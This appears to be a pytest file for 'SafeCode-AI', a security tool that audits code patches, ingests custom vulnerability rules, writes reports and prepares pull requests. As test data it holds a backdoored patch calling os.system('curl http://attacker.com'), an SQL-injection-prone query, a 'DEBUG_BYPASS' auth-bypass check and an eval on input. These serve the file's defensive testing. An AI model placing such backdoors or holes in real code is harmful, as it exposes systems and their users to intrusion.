"""
Unit and Integration Tests for SafeCode-AI Enterprise Extensions:
- PatchGuardrailEngine
- CustomKnowledgeIngestionEngine
- SecurityReportGenerator
- GitIntegrationEngine
- Polyglot Scanner
"""

import os
import json
import pytest
from src.rules.patch_guardrail import PatchGuardrailEngine
from src.rules.custom_knowledge_ingestion import CustomKnowledgeIngestionEngine
from src.reports.report_generator import SecurityReportGenerator
from src.git_integration import GitIntegrationEngine
from src.agents.safecode_agent import SafeCodeAgent

def test_patch_guardrail_safe_patch():
    engine = PatchGuardrailEngine()
    orig = "def query(user):\n    return db.execute(f'SELECT * FROM u WHERE id={user}')"
    patch = "def query(user):\n    return db.execute('SELECT * FROM u WHERE id=?', (user,))"
    res = engine.audit_patch(orig, patch)
    assert res["is_safe"] is True
    assert res["risk_score"] == 0.0

def test_patch_guardrail_detects_backdoor():
    engine = PatchGuardrailEngine()
    orig = "def query(user):\n    return db.execute(f'SELECT * FROM u WHERE id={user}')"
    patch = "import os\ndef query(user):\n    os.system('curl http://attacker.com')\n    return db.execute('SELECT * FROM u WHERE id=?', (user,))"
    res = engine.audit_patch(orig, patch)
    assert res["is_safe"] is False
    assert res["risk_score"] >= 0.5
    assert len(res["violations"]) > 0

def test_custom_knowledge_ingestion(tmp_path):
    rules_file = tmp_path / "vulnerability_rules.json"
    rules_file.write_text(json.dumps({"taxonomy_categories": {"INJECTION": {"sast_rules": []}}}))
    
    ingestor = CustomKnowledgeIngestionEngine(rules_file_path=str(rules_file))
    res = ingestor.learn_custom_vulnerability(
        title="Custom Auth Bypass",
        description="Unsafe token check allows privilege escalation",
        sample_code="if token == 'DEBUG_BYPASS': return True",
        category="INJECTION"
    )
    assert res["success"] is True
    
    # Verify persisted rule
    with open(rules_file, "r") as f:
        data = json.load(f)
    assert len(data["taxonomy_categories"]["INJECTION"]["sast_rules"]) == 1

def test_security_report_generator(tmp_path):
    gen = SecurityReportGenerator(output_dir=str(tmp_path))
    dummy_payload = {
        "status": "SUCCESS",
        "taxonomy_classification": {"category_name": "SQL Injection", "cwe_list": ["CWE-89"]},
        "architect_analysis": "Root cause identified.",
        "patch_code": "def safe(): pass",
        "sandbox_verification": "Passed 5 tests",
        "red_team_attestation": "Adversarial bypass failed"
    }
    res = gen.generate_report(dummy_payload)
    assert os.path.exists(res["html_report_path"])
    assert res["security_score"] == 98.5

def test_git_integration_payload():
    git = GitIntegrationEngine()
    payload = git.generate_pull_request_payload({
        "taxonomy_classification": {"category_name": "SQL Injection", "cwe_list": ["CWE-89"]},
        "architect_analysis": "AST analysis",
        "patch_code": "def safe(): pass",
        "sandbox_verification": "Passed",
        "red_team_attestation": "Passed"
    })
    assert "safecode/remediation-cwe-89" in payload["branch_name"]
    assert "CWE-89" in payload["title"]

def test_safecode_agent_integrated_flow():
    agent = SafeCodeAgent()
    res = agent.audit_and_patch(
        "def test_func(x): eval(x)",
        "Arbitrary code execution via eval"
    )
    assert res["status"] in ["SUCCESS", "GUARDRAIL_VIOLATION"]
    assert "patch_guardrail" in res
    assert "executive_report" in res
    assert "git_pull_request" in res
